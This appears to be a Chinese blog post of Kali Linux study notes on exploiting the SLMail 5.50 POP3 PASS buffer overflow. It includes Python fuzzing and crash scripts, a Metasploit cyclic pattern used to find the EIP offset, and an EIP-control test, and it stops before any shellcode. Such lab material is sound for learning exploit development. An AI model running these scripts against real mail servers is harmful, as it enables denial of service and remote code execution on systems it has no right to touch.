<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="å®‰å…¨," />










<meta name="description" content="1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰ SLMail 5.50 Mail Serverï¼ˆé»˜è®¤å®‰è£…ï¼ŒAbout NT User Importï¼Œno insteadï¼‰ ImmunityDebugger_1_85_setup.exeï¼ˆè¦å®‰è£…python2.7ç‰ˆæœ¬ï¼Œä¸å¯3.0ï¼‰ mona.pyï¼ˆGithubä¸Šä¸‹è½½ï¼‰   windowä¸Šçœ‹å¼€å¯çš„æœåŠ¡ 1.netstat -naoï¼ˆcmdï¼‰ 2.ser">
<meta name="keywords" content="å®‰å…¨">
<meta property="og:type" content="article">
<meta property="og:title" content="Kali Linuxç¬”è®°(äºŒåä¸ƒ)ï¼šWindowç¼“å†²åŒºæº¢å‡º">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;11&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:description" content="1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰ SLMail 5.50 Mail Serverï¼ˆé»˜è®¤å®‰è£…ï¼ŒAbout NT User Importï¼Œno insteadï¼‰ ImmunityDebugger_1_85_setup.exeï¼ˆè¦å®‰è£…python2.7ç‰ˆæœ¬ï¼Œä¸å¯3.0ï¼‰ mona.pyï¼ˆGithubä¸Šä¸‹è½½ï¼‰   windowä¸Šçœ‹å¼€å¯çš„æœåŠ¡ 1.netstat -naoï¼ˆcmdï¼‰ 2.ser">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2020-01-05T02:50:50.820Z">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/12/11/Kali Linuxç¬”è®°(äºŒåä¸ƒ)ï¼šWindowç¼“å†²åŒºæº¢å‡º/"/>





  <title>Kali Linuxç¬”è®°(äºŒåä¸ƒ)ï¼šWindowç¼“å†²åŒºæº¢å‡º | Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            åˆ†ç±»
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%83)%EF%BC%9AWindow%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Kali Linuxç¬”è®°(äºŒåä¸ƒ)ï¼šWindowç¼“å†²åŒºæº¢å‡º</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-11T13:03:18+08:00">
                2019-12-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  2.8k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  13 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <hr>
<h4 id="1-FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰"><a href="#1-FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰" class="headerlink" title="1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰"></a>1. FUZZERï¼ˆwindowç¼“å­˜åŒºæº¢å‡ºï¼‰</h4><ul>
<li>SLMail 5.50 Mail Serverï¼ˆé»˜è®¤å®‰è£…ï¼ŒAbout NT User Importï¼Œno insteadï¼‰</li>
<li>ImmunityDebugger_1_85_setup.exeï¼ˆè¦å®‰è£…python2.7ç‰ˆæœ¬ï¼Œä¸å¯3.0ï¼‰</li>
<li>mona.pyï¼ˆGithubä¸Šä¸‹è½½ï¼‰</li>
</ul>
<blockquote>
<pre><code>windowä¸Šçœ‹å¼€å¯çš„æœåŠ¡
1.netstat -naoï¼ˆcmdï¼‰
2.services.mscï¼ˆå…è®¸win+Rï¼‰</code></pre></blockquote>
<blockquote>
<pre><code>mona.pyæ”¾åœ¨ImmunityDebuggerä¸­
å³é”® â†’ æŸ¥æ‰¾ç›®æ ‡ â†’ PyCommonds â†’ æ‹·è´mona.py</code></pre></blockquote>
<h4 id="2-FUZZER"><a href="#2-FUZZER" class="headerlink" title="2. FUZZER"></a>2. FUZZER</h4><ul>
<li>SLMail 5.50 Mail Serverï¼ˆä¸åŒç«¯å£å¼€çš„ä¸åŒæœåŠ¡ï¼Œéƒ½æœ‰ä¸åŒæŒ‡ä»¤å¯ä»¥å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼‰<ul>
<li>POP3 PASSå‘½ä»¤å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ï¼ˆnc SMTP or POP3,shell codeè¿›è¡Œè¯•æ¢)</li>
<li>æ— éœ€èº«ä»½éªŒè¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</li>
<li>DEPï¼šé˜»æ­¢ä»£ç ä»æ•°æ®é¡µè¢«æ‰§è¡Œï¼ˆCPUç‰¹æ€§ï¼Œé€šè¿‡æ“ä½œç³»ç»Ÿè½¯ç¡¬ä»¶å®ç°ï¼Œå¯ç»•è¿‡DEPï¼‰</li>
<li>ALSAï¼šéšæœºå†…å­˜åœ°å€åŠ è½½æ‰§è¡Œç¨‹åºç›’DDLï¼Œæ¯æ¬¡é‡å¯åœ°å€å˜åŒ–ï¼ˆåŠ¨æ€å†…å­˜åœ°å€åˆ†é…ï¼Œé€šè¿‡shellç›´æ¥è·³è½¬åˆ°å›ºå®šçš„å†…å­˜åœ°å€ï¼Œæ“ä½œç³»ç»Ÿå®ç°ï¼Œåœ¨window vistaä¹‹ååŠ å…¥ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>åœ¨Kaliç«¯ï¼Œå‘å³é”®æœåŠ¡å™¨å‘é€å¤§é‡å‘½ä»¤ç»„åˆçš„å­—ç¬¦ä¸²ï¼ˆå¦‚ï¼šUSER;lsï¼‰
åœ¨window xpç«¯ï¼Œç”¨ImmunityDebuggeræŸ¥çœ‹åœ¨å‘é€å‘½ä»¤æ—¶æ˜¯å¦ä¼šå‡ºç°ç¼“å†²åŒºæº¢å‡º</code></pre></blockquote>
<h4 id="3-POP3"><a href="#3-POP3" class="headerlink" title="3. POP3"></a>3. POP3</h4><ul>
<li>nc IPåœ°å€ 110ç«¯å£</li>
<li>äº†è§£æœªçŸ¥åè®®<ul>
<li>Wiresharkï¼ˆæŠ“åŒ…åˆ†æå­¦ä¹ ï¼‰</li>
<li>æ ‡å‡†RFCï¼ˆæŸ¥è¯¢åè®®çš„å‚æ•°ï¼Œè¿›è¡Œå­¦ä¹ ï¼‰</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./01.py</code></strong>ï¼ˆæµ‹è¯•æ˜¯å¦èƒ½è¿æ¥POP3æœåŠ¡å™¨ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&apos;IPåœ°å€&apos;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;USER yuanfh&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.send(&apos;PASS test\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    print data</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="4-FUZZING"><a href="#4-FUZZING" class="headerlink" title="4. FUZZING"></a>4. FUZZING</h4><ul>
<li>æµ‹è¯•PASSå‘½ä»¤æ¥æ”¶åˆ°å¤§é‡æ•°æ®æ˜¯å¦ä¼šæº¢å‡ºï¼ˆéœ€è¦å‘é€çš„æ•°æ®å¤§äºç¼“å†²åŒºï¼‰</li>
<li>EIPå¯„å­˜å™¨å­˜æ”¾ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼ˆé¦–å…ˆå…³æ³¨EIPï¼ŒESPï¼ŒEDPï¼Œå¯ä½¿æŒ‡å‘shell codeçš„åœ°å€ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./02.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">buffer=[&apos;A&apos;]</span><br><span class="line">counter=100</span><br><span class="line">while len(buffer)&lt;=50:</span><br><span class="line">    buffer.append(&quot;A&quot;*counter)</span><br><span class="line">    counter=counter+200</span><br><span class="line">for string in buffer:</span><br><span class="line">    print &quot;Fuzzing PASS with %s bytes&quot;%len(string)</span><br><span class="line">    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    connect=s.connect((&apos;IPåœ°å€&apos;,110))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS &apos;+string+&apos;\r\n&apos;)</span><br><span class="line">    s.send(&apos;QUIT\r\n&apos;)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>ImmunityDebuggerè°ƒè¯•ï¼ˆè®°å½•ç¨‹åºçš„è¿è¡ŒçŠ¶æ€ï¼Œä¸ºä¸­é—´æ•°æ®çš„æ‹¦æˆªã€è®°å½•ï¼‰ï¼š
1.Open â†’ æ‰“å¼€ä¸€ä¸ªé™æ€çš„exeæ–‡ä»¶
2.Attack â†’ æ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼ˆé€šè¿‡PIDåŒºattackï¼Œattackä¼šä½¿è¿›ç¨‹åœæ­¢ï¼Œéœ€ç‚¹å‡»å¼€å§‹ï¼‰</code></pre></blockquote>
<h4 id="5-FUZZING"><a href="#5-FUZZING" class="headerlink" title="5. FUZZING"></a>5. FUZZING</h4><ul>
<li>2700ä¸ªå­—ç¬¦å®ç°EIPå¯„å­˜å™¨æº¢å‡º</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./03.py</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2700</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰¾åˆ°ç²¾ç¡®æº¢å‡ºçš„4ä¸ªå­—èŠ‚<ul>
<li>äºŒåˆ†æ³•</li>
<li>å”¯ä¸€å­—ä¸²æ³•</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./usr/share/metasploit-framwork/tools/exploit/pattern_create.rb -l 2700</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./pattern_offset.rb EIPçš„4ä¸ªåå…­è¿›åˆ¶æ•°å­—</code></strong>ï¼ˆé€šè¿‡å·¥å…·æ‰¾åˆ°ä½ç½®ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./04.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&apos;</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰¾åˆ°ç²¾ç¡®æº¢å‡ºçš„4ä¸ªå­—èŠ‚<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./05.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*20</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>windowç³»ç»Ÿä¸ºå°ç«¯å­˜å‚¨å½¢å¼ï¼Œä½ä½é«˜åœ°å€ï¼Œé«˜ä½ä½åœ°å€
EIPä¸º4ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—ï¼Œå¯é€šè¿‡ASCIIæ¢ç®—æˆå­—ç¬¦ä¸²
ESPå­˜æ”¾ç€EIPæº¢å‡ºçš„å†…å®¹ï¼Œå¯ä»¥å¡«æ”¾shell codeä½œä¸ºè¿œç¨‹æ‰§è¡Œä»£ç </code></pre></blockquote>
<h4 id="6-FUZZING"><a href="#6-FUZZING" class="headerlink" title="6. FUZZING"></a>6. FUZZING</h4><ul>
<li>æ€è·¯ï¼š<ul>
<li>å°†EIPä¿®æ”¹ä¸ºShellcodeä»£ç çš„å†…å­˜åœ°å€ï¼Œå°†Shellcodeå†™å…¥åˆ°è¯¥åœ°å€ç©ºé—´ï¼Œç¨‹åºè¯»å–EIPå¯„å­˜å™¨æ•°å€¼ï¼Œå°†è·³è½¬åˆ°Shellcodeä»£ç æ®µå¹¶æ‰§è¡Œ</li>
</ul>
</li>
<li>å¯»æ‰¾å¯å­˜æ”¾Shellcodeçš„å†…å®¹ç©ºé—´</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./06.py</code></strong>ï¼ˆæŸ¥çœ‹ESPå¯„å­˜å™¨å¯å­˜æ”¾å¤šå°‘ä¸ªå­—ç¬¦ï¼‰</li>
</ul>
